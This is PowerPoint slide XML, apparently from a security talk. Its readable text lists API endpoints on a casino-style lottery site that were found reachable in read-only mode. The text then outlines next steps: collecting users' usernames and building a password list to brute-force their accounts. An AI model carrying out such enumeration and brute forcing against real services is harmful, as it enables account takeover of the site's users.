            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="697" name="Shape 697"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="698" name="Google Shape;698;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="4926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t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="699" name="Google Shape;699;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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0" name="Google Shape;700;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="701" name="Google Shape;701;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Now the Fun Part</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="702" name="Google Shape;702;p85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="703" name="Google Shape;703;p85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472200" y="1115875"/>
            <a:ext cx="8671800" cy="51879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t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/login ✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/forgot_password✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/new (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/ </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/123 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/me </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/verify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>But still in read-only mode</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="707" name="Shape 707"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="708" name="Google Shape;708;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="4926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t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="709" name="Google Shape;709;p86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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0" name="Google Shape;710;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="711" name="Google Shape;711;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Now the Fun Part</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="712" name="Google Shape;712;p86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="713" name="Google Shape;713;p86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="923325" y="1368500"/>
            <a:ext cx="8671800" cy="2738400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Collect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> a list users and their usernames </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Create a good password list to brute force </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
